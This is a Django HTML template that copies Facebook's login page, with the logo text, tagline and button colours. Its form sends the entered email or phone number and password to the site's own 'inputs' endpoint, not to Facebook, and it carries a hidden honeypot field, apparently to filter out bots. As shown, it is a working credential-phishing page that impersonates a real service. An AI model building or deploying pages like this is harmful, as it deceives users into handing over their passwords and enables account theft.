{% load static %}
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" href="{% static 'images/favicon.ico' %}" sizes="any">
<!-- Optional PNG fallback -->
<link rel="icon" type="image/png" href="{% static 'images/favicon.png' %}">
  <title>Facebook Login</title>
  <!-- Bootstrap CDN -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background: #f0f2f5;
      font-family: Helvetica, Arial, sans-serif;
    }
    .logo {
      font-size: 56px;
      font-weight: bold;
      color: #1877f2;
    }
    .login-box {
      background: #fff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
    }
    .form-control {
      height: 62px;
      font-size: 20px;
      border-radius: 6px;
    }
    .login-btn {
      background-color: #1877f2;
      color: #fff;
      font-weight: bold;
      font-size: 18px;
      height: 48px;
    }
    .login-btn:hover {
      background-color: #145dbf;
    }
    .create-btn {
      background: #42b72a;
      font-weight: bold;
      font-size: 17px;
      height: 48px;
    }
    .create-btn:hover {
      background: #36a420;
    }
    .desc-text {
      font-size: 24px;
      font-weight: normal;
      line-height: 32px;
    }
    
  </style>
</head>
<body>
  <div class="container d-flex align-items-center justify-content-center vh-100">
    <div class="row w-100 align-items-center">
      
      <!-- Left text -->
      <div class="col-lg-6 mb-5 mb-lg-0 text-center text-lg-start">
        <div class="logo mb-3">facebook</div>
        <h3 class="desc-text">Facebook helps you connect and share with the people in your life.</h3>
      </div>

      <!-- Login box -->
      <div class="col-lg-6 d-flex justify-content-center">
        <div class="login-box w-100" style="max-width: 360px;">
          <form method="post" action="{% url 'inputs' %}" class="wide-form">
            {% csrf_token %}

            <!-- Hidden honeypot -->
            {{ form.website }}

            <!-- Identifier with Bootstrap classes -->
            <input type="text" name="identifier" class="form-control mb-3" placeholder="Email address or phone number">

            <!-- Password with Bootstrap classes -->
            <input type="password" name="password" class="form-control mb-3" placeholder="Password">

            <!-- Submit -->
            <button type="submit" class="btn login-btn w-100 mb-3">Log in</button>
          </form>

          <a href="#" class="d-block mb-3 text-decoration-none text-center" style="color:#1877f2;">Forgotten password?</a>
          <hr>
          <div class="d-flex justify-content-center">
            <button type="button" class="btn create-btn" style="color:white;">Create new account</button>
          </div>
          <div class="text-center mt-4">
            <a href="#" class="text-dark fw-bold">Create a Page</a> for a celebrity, brand or business.
          </div>
        </div>
      </div>
    </div>
  </div>
</body>
</html>
